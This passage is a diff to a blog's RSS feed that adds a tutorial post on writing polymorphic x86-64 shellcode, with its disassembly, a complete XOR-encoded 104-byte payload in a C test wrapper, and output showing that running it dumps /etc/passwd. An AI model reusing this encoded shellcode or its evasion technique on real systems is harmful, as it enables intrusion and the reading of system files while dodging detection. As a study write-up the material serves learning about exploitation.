class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now the shellcode is ready to pown binary’s!&lt;/p&gt;
+
+&lt;h1 id=&quot;4-the-shellcode&quot;&gt;4. The shellcode&lt;/h1&gt;
+&lt;p&gt;The final shellcode is on the last schema, now we can assemble it, compile it and check null-bytes:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf64 polymorphic.s &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; polymorphic.o
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld polymorphic.o &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; polymorphic             
+ld: warning: cannot find entry symbol _start&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; defaulting to 0000000000400080
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; polymorphic        
+
+polymorphic:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 &amp;lt;_start&amp;gt;:
+  400080:	eb 15                	jmp    400097 &amp;lt;L1&amp;gt;
+
+0000000000400082 &amp;lt;L2&amp;gt;:
+  400082:	5e                   	pop    %rsi
+  400083:	48 31 c9             	xor    %rcx,%rcx
+  400086:	b1 4c                	mov    &lt;span class=&quot;nv&quot;&gt;$0x4c&lt;/span&gt;,%cl
+
+0000000000400088 &amp;lt;L3&amp;gt;:
+  400088:	80 34 0e 69          	xorb   &lt;span class=&quot;nv&quot;&gt;$0x69&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rsi,%rcx,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  40008c:	80 e9 01             	sub    &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,%cl
+  40008f:	75 f7                	jne    400088 &amp;lt;L3&amp;gt;
+  400091:	80 34 0e 69          	xorb   &lt;span class=&quot;nv&quot;&gt;$0x69&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rsi,%rcx,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  400095:	eb 05                	jmp    40009c &amp;lt;L4&amp;gt;
+
+0000000000400097 &amp;lt;L1&amp;gt;:
+  400097:	e8 e6 ff ff ff       	callq  400082 &amp;lt;L2&amp;gt;
+
+000000000040009c &amp;lt;L4&amp;gt;:
+  40009c:	82                   	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bad&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+  40009d:	50                   	push   %rax
+  40009e:	36 e9 1e 62 28 21    	ss jmpq 216862c2 &amp;lt;__bss_start+0x210852c2&amp;gt;
+  4000a4:	58                   	pop    %rax
+  4000a5:	a9 6d 6b 21 58       	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;$0x58216b6d&lt;/span&gt;,%eax
+  4000aa:	9f                   	lahf   
+  4000ab:	66 6c                	data16 insb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%dx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%es:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000ad:	21 e0                	and    %esp,%eax
+  4000af:	ae                   	scas   %es:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%al
+  4000b0:	21 e4                	and    %esp,%esp
+  4000b2:	5d                   	pop    %rbp
+  4000b3:	4d 21 58 bb          	and    %r11,-0x45&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%r8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000b7:	0f d3 96 66 21 58 a9 	psrlq  &lt;span class=&quot;nt&quot;&gt;-0x56a7de9a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rsi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%mm2
+  4000be:	66 6c                	data16 insb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%dx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%es:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000c0:	21 58 96             	and    %ebx,-0x6a&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rax&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000c3:	29 de                	sub    %ebx,%esi
+  4000c5:	68 21 e0 ab 21       	pushq  &lt;span class=&quot;nv&quot;&gt;$0x21abe021&lt;/span&gt;
+  4000ca:	58                   	pop    %rax
+  4000cb:	a9 d9 68 66 6c       	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;$0x6c6668d9&lt;/span&gt;,%eax
+  4000d0:	21 58 a9             	and    %ebx,-0x57&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rax&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000d3:	d9 55 66             	fsts   0x66&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000d6:	6c                   	insb   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%dx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%es:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000d7:	81 ab 96 96 96 46 0c 	subl   &lt;span class=&quot;nv&quot;&gt;$0x460a1d0c&lt;/span&gt;,0x46969696&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000de:	1d 0a 46 
+  4000e1:	19 08                	sbb    %ecx,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rax&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  4000e3:	1a 1a                	sbb    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%bl
+  4000e5:	1e                   	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bad&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+  4000e6:	0d                   	.byte 0xd
+  4000e7:	28                   	.byte 0x28
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Everything might be correct.&lt;/p&gt;
+
+&lt;h1 id=&quot;5-demonstration&quot;&gt;5. Demonstration&lt;/h1&gt;
+&lt;p&gt;And the final C wrapper to test the shellcode:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x15\x5e\x48\x31\xc9\xb1\x4c\x80\x34\x0e\x69\x80\xe9\x01\x75\xf7\x80\x34\x0e\x69\xeb\x05\xe8\xe6\xff\xff\xff\x82\x50\x36\xe9\x1e\x62\x28\x21\x58\xa9\x6d\x6b\x21\x58\x9f\x66\x6c\x21\xe0\xae\x21\xe4\x5d\x4d\x21\x58\xbb\x0f\xd3\x96\x66\x21\x58\xa9\x66\x6c\x21\x58\x96\x29\xde\x68\x21\xe0\xab\x21\x58\xa9\xd9\x68\x66\x6c\x21\x58\xa9\xd9\x55\x66\x6c\x81\xab\x96\x96\x96\x46\x0c\x1d\x0a\x46\x19\x08\x1a\x1a\x1e\x0d\x28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now compile it and test it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc wrapper.c &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./a.out 
+Shellcode length: 104
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+</description>
+				<pubDate>Tue, 06 Jun 2017 00:00:00 +0100</pubDate>
+				<link>/shellcode/2017/06/06/polymorphic_shellcode.html</link>
+				<guid isPermaLink="true">/shellcode/2017/06/06/polymorphic_shellcode.html</guid>
+			</item>
+		
+			<item>
 				<title>Basic Shellcode</title>
 				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
@@ -1393,17 +1586,6 @@ id
 				<pubDate>Thu, 14 Nov 2013 00:00:00 +0000</pubDate>
 				<link>/general/demo/2013/11/14/sample.html</link>
 				<guid isPermaLink="true">/general/demo/2013/11/14/sample.html</guid>
-			</item>
-		
-			<item>
-				<title>Sample 2</title>
-				<description>&lt;p&gt;Lorem ipsum dolor sit amet,  consectetur adipisicing elit,  sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,  quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident,  sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet,  consectetur adipisicing elit,  sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,  quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident,  sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p&gt;
-</description>
-				<pubDate>Thu, 14 Nov 2013 00:00:00 +0000</pubDate>
-				<link>/general/demo/sample/2013/11/14/sample-2.html</link>
-				<guid isPermaLink="true">/general/demo/sample/2013/11/14/sample-2.html</guid>
 			</item>
 		
 	</channel>
